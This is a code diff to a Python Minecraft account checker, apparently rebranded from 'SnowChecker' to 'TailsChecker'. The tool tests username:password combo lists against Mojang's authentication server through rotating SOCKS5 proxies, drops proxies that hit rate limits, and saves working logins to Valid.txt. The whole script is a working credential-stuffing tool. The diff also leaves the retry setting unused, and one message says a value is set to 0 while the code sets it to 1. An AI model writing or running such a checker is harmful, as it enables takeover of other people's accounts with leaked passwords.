@@ -7,16 +7,20 @@ import threading, requests
 import ctypes, time, os
 import random
 
-yellow = Fore.LIGHTYELLOW_EX
-red = Fore.LIGHTRED_EX
-green = Fore.LIGHTGREEN_EX
-cyan = Fore.LIGHTCYAN_EX
-blue = Fore.LIGHTBLUE_EX
-white = Fore.LIGHTWHITE_EX
-magenta = Fore.LIGHTMAGENTA_EX
+class Colors:
+    global white, yellow, red, green, cyan, blue, magenta
+
+    yellow = Fore.LIGHTYELLOW_EX
+    red = Fore.LIGHTRED_EX
+    green = Fore.LIGHTGREEN_EX
+    cyan = Fore.LIGHTCYAN_EX
+    blue = Fore.LIGHTBLUE_EX
+    white = Fore.LIGHTWHITE_EX
+    magenta = Fore.LIGHTMAGENTA_EX
+Colors()
 
 version = "0.2"
-mark = f'{white}\n' + requests.get("https://pastebin.com/raw/jHQh1YYm").text + f"\n\n{magenta}  SnowChecker-{version} »» by Starlysh & Devs Team \n"
+mark = f'{red}\n' + requests.get("https://pastebin.com/raw/uxJtrC3n").text + f"\n\n{red}  TailsChecker-{version} »» Created by Tails Team\n"
 
 class Main:
     def __init__(self):
@@ -69,24 +73,21 @@ class Main:
     
     def check_account(self, username, password):
         try:
-            for uwu in range(self.retries):
-                session = self.session()
-                proxy = random.choice(self.proxy_list)
-                json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
-                check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = dict(
-                    http="socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080",
-                    https="socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080"
-                ))
-                
-                # print(check.json())
+            session = self.session()
+            proxy = random.choice(self.proxy_list)
+            json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
+            check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = dict(
+                http="socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080",
+                https="socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080"
+            ))
 
-                if "accessToken" in check.json():
-                    print(f'{green}[Good] {white}{username}:{password}')
-                elif "error" in check.json():
-                    print(f'{red}[Bad] {white}{username}:{password}')
-                elif "The request could not be satisfied." in check.content:
-                    print(f'{yellow}[Rate Limited] {white}{username}:{password}')
-                    self.proxy_list.remove(proxy)
+            if "accessToken" in check.json():
+                print(f'{green}[Good] {white}{username}:{password}')
+            elif "error" in check.json():
+                print(f'{red}[Bad] {white}{username}:{password}')
+            elif "The request could not be satisfied." in check.content:
+                print(f'{yellow}[Rate Limited] {white}the request could not be satisfied, removing proxy.')
+                self.proxy_list.remove(proxy)
             
             if "clientToken" in check.text:
                 with open("Valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
@@ -115,16 +116,16 @@ class Main:
         load_combo = self.load_combos()
         if load_combo is not None:
             print(mark)
-            self.threads = int(input(f'{blue}> {white}Threads: '))
+            self.threads = int(input(f'{red}> {white}Threads: '))
             os.system("cls")
             print(mark)
-            self.retries = int(input(f'{blue}> {white}Retries (1 = default, 3 max): '))
+            self.retries = int(input(f'{red}> {white}Retries (0 = default, 3 max): '))
             if self.retries == 0:
                 self.retries = 1
-            elif self.retries > 3 or self.retries < 1:
-                retries_old = self.retries
+            elif self.retries > 3 or self.retries < 0:
+                print(f'{red}Retry value exceeded expectations ({self.retries}), value set to 0.')
                 self.retries = 1
-                print(f'{red}Unexpected value ({retries_old}, new value {self.retries}')
+                
             os.system("cls")
             self.load_proxies()
             self.start_checking()
@@ -132,11 +133,5 @@ class Main:
             os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Error"); 
             print(f'{yellow}ERROR{white} : Please put your combos inside of \'combo.txt\''); time.sleep(10); 
             exit()
-
+    
 Main().main()
-
-if __name__ == '__main__':
-    session = Session()    
-    # if SnowChecker.version_check:
-    #     checkforupdates()
-Main()
